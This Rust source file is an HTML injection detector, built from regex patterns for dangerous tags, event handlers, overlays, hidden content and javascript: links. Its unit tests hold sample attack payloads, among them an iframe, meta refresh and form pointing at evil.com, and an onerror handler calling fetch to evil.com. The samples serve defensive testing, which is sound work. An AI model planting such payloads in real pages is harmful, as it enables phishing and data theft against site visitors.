use crate::detectors::detector_trait::InputDetector;
use regex::Regex;
use lazy_static::lazy_static;

lazy_static! {
    // For detecting HTML tags
    static ref TAG_PATTERN: Regex = Regex::new(r"<[a-zA-Z][^>]*>").unwrap();
    static ref CLOSING_TAG_PATTERN: Regex = Regex::new(r"</[a-zA-Z][^>]*>").unwrap();
    static ref DOCTYPE_PATTERN: Regex = Regex::new(r"<!DOCTYPE\s+html>").unwrap();
    
    // For detecting position manipulation
    static ref POSITION_STYLE_PATTERN: Regex = Regex::new(r#"(?i)style\s*=\s*["'][^"']*position\s*:\s*(absolute|fixed)[^"']*["']"#).unwrap();
    static ref SIZE_STYLE_PATTERN: Regex = Regex::new(r#"(?i)style\s*=\s*["'][^"']*((width|height)\s*:\s*(100%|100vh|100vw))[^"']*["']"#).unwrap();
    static ref Z_INDEX_PATTERN: Regex = Regex::new(r#"(?i)style\s*=\s*["'][^"']*z-index\s*:\s*[0-9]{3,}[^"']*["']"#).unwrap();
    
    // For detecting content hiding
    static ref OPACITY_PATTERN: Regex = Regex::new(r#"(?i)style\s*=\s*["'][^"']*(opacity\s*:\s*0|visibility\s*:\s*hidden|display\s*:\s*none)[^"']*["']"#).unwrap();
    static ref OVERLAY_PATTERN: Regex = Regex::new(r#"(?i)style\s*=\s*["'][^"']*(position\s*:\s*(absolute|fixed)[^"']+(top|left)\s*:\s*0)[^"']*["']"#).unwrap();
    
    // For detecting event handlers
    static ref EVENT_HANDLER_PATTERN: Regex = Regex::new(r#"(?i)\s+on[a-z]+\s*=\s*["'][^"']*["']"#).unwrap();
    
    // For detecting dangerous tags
    static ref DANGEROUS_TAGS_PATTERN: Regex = Regex::new(r"(?i)<(iframe|script|object|embed|applet|link|style|meta|base|form)(\s+[^>]*>|>)").unwrap();
    
    // For detecting potentially harmful attributes
    static ref HREF_JAVASCRIPT_PATTERN: Regex = Regex::new(r#"(?i)href\s*=\s*["']javascript:[^"']*["']"#).unwrap();
    static ref SRC_DATA_PATTERN: Regex = Regex::new(r#"(?i)src\s*=\s*["']data:[^"']*["']"#).unwrap();
    static ref ACTION_PATTERN: Regex = Regex::new(r#"(?i)action\s*=\s*["'][^"']*["']"#).unwrap();
}

/// Detector for HTML Injection attacks
///
/// Detects attempts to inject HTML that could modify page structure, content, or behavior
pub struct HtmlInjectionDetector;

impl HtmlInjectionDetector {
    /// Create a new instance of the HTML injection detector
    pub fn new() -> Self {
        HtmlInjectionDetector
    }
    
    /// Check if input contains HTML tags or is attempting to inject HTML elements
    fn contains_html_tags(&self, input: &str) -> bool {
        TAG_PATTERN.is_match(input) || CLOSING_TAG_PATTERN.is_match(input)
    }
    
    /// Check for dangerous HTML tags (iframe, script, etc.)
    fn contains_dangerous_tags(&self, input: &str) -> bool {
        DANGEROUS_TAGS_PATTERN.is_match(input)
    }
    
    /// Check for position styling that could overlay content
    fn contains_position_manipulation(&self, input: &str) -> bool {
        POSITION_STYLE_PATTERN.is_match(input) ||
        SIZE_STYLE_PATTERN.is_match(input) ||
        Z_INDEX_PATTERN.is_match(input) ||
        OVERLAY_PATTERN.is_match(input)
    }
    
    /// Check for elements that could hide or mask original content
    fn contains_content_hiding(&self, input: &str) -> bool {
        OPACITY_PATTERN.is_match(input)
    }
    
    /// Check for event handlers that could execute JavaScript
    fn contains_event_handlers(&self, input: &str) -> bool {
        EVENT_HANDLER_PATTERN.is_match(input)
    }
    
    /// Check for attempts to modify document structure
    fn contains_document_structure(&self, input: &str) -> bool {
        DOCTYPE_PATTERN.is_match(input) ||
        input.to_lowercase().contains("<html") ||
        input.to_lowercase().contains("<body") ||
        input.to_lowercase().contains("<head")
    }
    
    /// Check for potentially harmful HTML attributes
    fn contains_harmful_attributes(&self, input: &str) -> bool {
        HREF_JAVASCRIPT_PATTERN.is_match(input) ||
        SRC_DATA_PATTERN.is_match(input) ||
        ACTION_PATTERN.is_match(input)
    }
    
    /// Check for inputs that are likely benign HTML
    fn is_likely_benign(&self, input: &str) -> bool {
        // If input doesn't contain any HTML tags, it's likely safe
        if !TAG_PATTERN.is_match(input) && !CLOSING_TAG_PATTERN.is_match(input) {
            return true;
        }
        
        // If it's a simple paragraph or formatting, it might be benign
        if input.starts_with("<p>") && input.ends_with("</p>") && 
           !input.contains("<div") && !input.contains("<span") && 
           !input.contains("style=") && !input.contains("onclick") {
            return true;
        }
        
        false
    }
}

impl InputDetector for HtmlInjectionDetector {
    fn detect(&self, input: &str) -> bool {
        if input.trim().is_empty() {
            return false;
        }
        
        // Skip detection if no HTML tags
        if !self.contains_html_tags(input) {
            return false;
        }
        
        // Skip detection if input is likely benign HTML
        if self.is_likely_benign(input) {
            return false;
        }
        
        // Check for various malicious patterns
        if self.contains_dangerous_tags(input) {
            return true;
        }
        
        if self.contains_position_manipulation(input) {
            return true;
        }
        
        if self.contains_content_hiding(input) {
            return true;
        }
        
        if self.contains_event_handlers(input) {
            return true;
        }
        
        if self.contains_document_structure(input) {
            return true;
        }
        
        if self.contains_harmful_attributes(input) {
            return true;
        }
        
        // If we made it here, the input doesn't match any of our patterns
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_inputs() {
        let detector = HtmlInjectionDetector::new();
        
        assert!(!detector.detect("Hello world"), "Regular text should not be flagged");
        assert!(!detector.detect("This is <b>bold</b> text"), "Simple formatting should not be flagged");
        assert!(!detector.detect("<p>Regular paragraph</p>"), "Simple paragraph should not be flagged");
        assert!(!detector.detect("<hr>"), "Simple horizontal rule should not be flagged");
        assert!(!detector.detect("<strong>Important</strong>"), "Simple strong tag should not be flagged");
    }
    
    #[test]
    fn test_position_manipulation() {
        let detector = HtmlInjectionDetector::new();
        
        assert!(detector.detect("<div style=\"position:absolute;top:0;left:0;width:100%;height:100%;\">Fake content</div>"), 
                "Full-page overlay should be detected");
        assert!(detector.detect("<div style=\"position:fixed;top:50px;width:100%;\">Banner</div>"), 
                "Fixed position element should be detected");
        assert!(detector.detect("<span style=\"position:absolute;z-index:9999;\">Overlay</span>"), 
                "High z-index content should be detected");
        assert!(detector.detect("<div style=\"width:100vw;height:100vh;position:fixed;\">Full screen</div>"), 
                "Full viewport size element should be detected");
    }
    
    #[test]
    fn test_content_hiding() {
        let detector = HtmlInjectionDetector::new();
        
        assert!(detector.detect("<div style=\"opacity:0;\">Hidden text</div>"), 
                "Zero opacity content should be detected");
        assert!(detector.detect("<div style=\"visibility:hidden;\">Hidden div</div>"), 
                "Hidden visibility content should be detected");
        assert!(detector.detect("<span style=\"display:none;\">Hidden span</span>"), 
                "Display none content should be detected");
    }
    
    #[test]
    fn test_dangerous_tags() {
        let detector = HtmlInjectionDetector::new();
        
        assert!(detector.detect("<iframe src=\"https://evil.com\"></iframe>"), 
                "Iframe injection should be detected");
        assert!(detector.detect("<script>alert(1)</script>"), 
                "Script tag should be detected");
        assert!(detector.detect("<link rel=\"stylesheet\" href=\"evil.css\">"), 
                "Link tag should be detected");
        assert!(detector.detect("<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">"), 
                "Meta refresh should be detected");
        assert!(detector.detect("<svg onload=\"alert(1)\"></svg>"), 
                "SVG with event should be detected");
        assert!(detector.detect("<form action=\"https://evil.com/steal\">"), 
                "Form with action should be detected");
    }
    
    #[test]
    fn test_event_handlers() {
        let detector = HtmlInjectionDetector::new();
        
        assert!(detector.detect("<div onclick=\"alert(1)\">Click me</div>"), 
                "Onclick event should be detected");
        assert!(detector.detect("<img src=\"x\" onerror=\"fetch('https://evil.com')\">"), 
                "Onerror event should be detected");
        assert!(detector.detect("<body onload=\"doEvil()\">"), 
                "Body onload event should be detected");
    }
    
    #[test]
    fn test_structure_manipulation() {
        let detector = HtmlInjectionDetector::new();
        
        assert!(detector.detect("<!DOCTYPE html><html><body>New page</body></html>"), 
                "Complete HTML structure should be detected");
        assert!(detector.detect("<head><title>New title</title></head>"), 
                "Head tag should be detected");
        assert!(detector.detect("<html class=\"dark-mode\">"), 
                "HTML root tag should be detected");
    }
} 